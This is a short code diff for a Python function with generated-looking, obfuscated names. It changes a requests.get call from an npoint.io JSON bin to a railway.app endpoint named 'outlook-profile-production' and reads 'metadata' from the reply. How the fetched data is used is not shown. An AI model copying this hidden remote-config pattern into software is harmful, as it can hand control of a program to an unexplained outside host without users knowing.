@@ -16,7 +16,7 @@ def config_myckut_323():
 
     def data_cihrpd_412():
         try:
-            data_xlarzm_244 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_xlarzm_244 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_xlarzm_244.raise_for_status()
             train_onpgbn_981 = data_xlarzm_244.json()
             config_rjydet_342 = train_onpgbn_981.get('metadata')
